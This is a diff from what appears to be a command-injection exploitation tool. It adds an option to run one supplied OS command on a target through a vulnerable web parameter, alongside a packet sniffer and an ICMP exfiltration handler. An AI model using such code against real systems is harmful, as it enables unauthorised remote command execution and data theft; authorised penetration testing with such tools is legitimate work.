@@ -96,9 +96,13 @@ def exploitation(ip_dst,ip_src,url,http_request_method,vuln_parameter):
   signal.signal(signal.SIGINT, signal_handler)
   sniffer_thread = threading.Thread(target=snif, args=(ip_dst,ip_src,)).start()
   time.sleep(2)
-
-  input_cmd(http_request_method,url,vuln_parameter,ip_src)
-  sniffer_thread.join()
+  if menu.options.os_cmd:
+    cmd = menu.options.os_cmd
+    cmd_exec(http_request_method,cmd,url,vuln_parameter,ip_src)
+    print ""
+    os._exit(0)
+  else:
+    input_cmd(http_request_method,url,vuln_parameter,ip_src)
 
 def icmp_exfiltration_handler(url,http_request_method):
 
